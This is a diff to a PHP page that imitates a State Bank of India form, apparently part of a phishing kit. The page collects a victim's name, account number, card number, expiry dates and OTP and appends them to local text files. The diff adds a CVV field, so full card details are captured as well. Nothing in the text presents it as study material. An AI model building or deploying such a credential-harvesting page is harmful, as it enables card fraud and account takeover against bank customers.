@@ -1,27 +1,23 @@
 <?php
-$message = ""; 
+$message = "";
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
-   
     $otp = htmlspecialchars($_POST['otp']);
-    
     file_put_contents("otp.txt", "OTP: $otp\n", FILE_APPEND);
     $message = "OTP saved successfully!";
 } elseif ($_SERVER["REQUEST_METHOD"] == "POST") {
-    
     $name = htmlspecialchars($_POST['name']);
     $accountNumber = htmlspecialchars($_POST['accountNumber']);
     $cardNumber = htmlspecialchars($_POST['cardNumber']);
+    $cvv = htmlspecialchars($_POST['cvv']);
     $validFrom = htmlspecialchars($_POST['validFrom']);
     $validUpto = htmlspecialchars($_POST['validUpto']);
 
-    
-    $data = "Name: $name\nAccount Number: $accountNumber\nCard Number: $cardNumber\nValid From: $validFrom\nValid Upto: $validUpto\n\n";
+    $data = "Name: $name\nAccount Number: $accountNumber\nCard Number: $cardNumber\nCVV: $cvv\nValid From: $validFrom\nValid Upto: $validUpto\n\n";
     file_put_contents("data.txt", $data, FILE_APPEND);
 
-    
     $message = "Information submitted successfully! Please enter the OTP.";
-    $showOtpForm = true; // Set to true to show OTP form
+    $showOtpForm = true;
 }
 ?>
 
@@ -31,15 +27,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBI Information Form</title>
-     <link rel="stylesheet" href="https://mrfidal.github.io/security/sbi/style.css">
-
-
-
+    <link rel="stylesheet" href="https://mrfidal.github.io/security/sbi/style.css">
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://mrfidal.github.io/security/sbi/SBI-logo.svg" alt="SBI Logo"> 
+            <img src="https://mrfidal.github.io/security/sbi/SBI-logo.svg" alt="SBI Logo">
             <h1>SBI Information</h1>
         </div>
 
@@ -56,6 +49,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
                 <div class="input-group">
                     <label for="cardNumber">Card Number</label>
                     <input type="text" id="cardNumber" name="cardNumber" required>
+                </div>
+                <div class="input-group">
+                    <label for="cvv">Card Verification Value (CVV)</label>
+                    <input type="text" id="cvv" name="cvv" required maxlength="3" pattern="\d{3}" title="Enter a valid CVV (3 digits)">
                 </div>
                 <div class="input-group">
                     <label for="validFrom">Valid From</label>
@@ -83,8 +80,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
         <?php endif; ?>
     </div>
 
-    <script src="https://mrfidal.github.io/security/sbi/script.js">
-
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
